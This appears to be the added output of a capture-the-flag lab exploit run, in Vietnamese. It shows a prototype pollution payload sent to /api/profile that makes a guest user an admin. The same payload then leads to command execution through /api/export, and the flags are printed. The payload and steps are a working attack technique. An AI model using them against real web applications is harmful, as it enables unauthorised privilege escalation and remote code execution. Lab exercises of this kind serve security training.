@@ -1,0 +1,16 @@
+[*] Buoc 1: baseline - GET /api/whoami
+    {"username":"guest","isAdmin":false}
+
+[*] Buoc 2: o nhiem - POST /api/profile voi __proto__
+    payload = {"__proto__":{"isAdmin":true,"preprocess":"id"}}
+    server: {"ok":true,"settings":{}}
+
+[*] Buoc 3: doi hanh vi - GET /api/whoami lai
+    {"username":"guest","isAdmin":true,"flag":"FLAG{9.4_prototype_pollution_priv_esc}","note":"object user moi tu nhien co isAdmin=true do Object.prototype bi o nhiem"}
+
+[*] Buoc 4: RCE - POST /api/export (app doc config.preprocess bi o nhiem)
+    preprocess_ran    = "id"
+    preprocess_output = "uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)"
+
+[+] Priv-esc flag: FLAG{9.4_prototype_pollution_priv_esc}
+[+] RCE flag:      FLAG{9.4_prototype_pollution_to_rce}
